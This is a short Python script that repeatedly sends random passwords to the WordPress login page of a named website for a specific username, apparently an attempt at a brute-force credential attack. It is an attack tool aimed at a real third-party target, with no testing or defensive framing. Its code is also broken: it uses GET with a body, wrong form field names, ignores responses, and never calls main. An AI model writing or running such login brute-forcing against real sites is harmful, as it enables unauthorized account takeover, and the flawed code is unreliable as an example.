import requests
import random

url = "https://diziwatch.net/wp-login.php"
username = "zegasega"

def send_request(username , password):
    data = {

        "username" : username,
        "password" : password
    }
    r = requests.get(url,data=data)
    return r

chars ="abcdefghijklmnopqrstuvwxyz0123456789"




def main ():
    while True:
        rndpasswd = random.choices(chars,k=random.randint(1,100))
        passwd = "".join(rndpasswd)
        r = send_request(username,passwd)

        
